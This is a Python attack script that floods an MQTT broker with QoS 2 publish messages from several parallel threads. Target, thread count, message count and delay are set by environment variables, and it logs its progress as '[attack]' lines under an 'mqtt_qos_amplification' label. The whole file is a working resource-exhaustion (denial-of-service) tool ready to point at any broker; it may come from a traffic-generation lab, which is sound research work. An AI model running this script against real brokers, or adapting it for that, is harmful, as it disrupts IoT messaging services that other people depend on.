#!/usr/bin/env python3
import os
import sys
import threading
import time

import paho.mqtt.client as mqtt


def env_int(name: str, default: int) -> int:
    try:
        return int(os.getenv(name, str(default)))
    except ValueError:
        return default


def qos_worker(broker: str, port: int, worker_id: int, count: int, delay_ms: int, topic: str, prefix: str, stats: dict) -> None:
    client_id = f"{prefix}_{worker_id}"
    client = mqtt.Client(client_id=client_id, clean_session=True)
    try:
        client.connect(broker, port, 60)
        client.loop_start()
        ok = 0
        for i in range(count):
            result = client.publish(topic, f"QoS2_Amplified_{worker_id}_{i}", qos=2)
            result.wait_for_publish(timeout=2)
            ok += 1
            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)
        client.disconnect()
        client.loop_stop()
        stats[worker_id] = ok
        print(f"[attack] qos_worker_done worker={worker_id} sent={ok}", flush=True)
    except Exception as exc:
        try:
            client.loop_stop()
        except Exception:
            pass
        stats[worker_id] = 0
        print(f"[attack] qos_worker_failed worker={worker_id} error={exc}", flush=True)


def main() -> int:
    broker = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET_IP", "localhost")
    port = int(sys.argv[2] if len(sys.argv) > 2 else os.getenv("TARGET_PORT", "1883"))
    threads_count = env_int("THREADS", 8)
    count = env_int("COUNT", 20)
    delay_ms = env_int("DELAY_MS", 20)
    topic = os.getenv("TOPIC", "attack/mqtt_qos_amplification")
    prefix = os.getenv("CLIENT_PREFIX", "qos_amplifier")

    stats = {}
    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=qos_worker, args=(broker, port, i, count, delay_ms, topic, prefix, stats), daemon=False)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    sent = sum(stats.values())
    failed_workers = sum(1 for value in stats.values() if value == 0)
    print(f"[attack] mqtt_qos_amplification summary sent={sent} failed_workers={failed_workers}", flush=True)
    return 0 if sent > 0 else 2


if __name__ == "__main__":
    raise SystemExit(main())
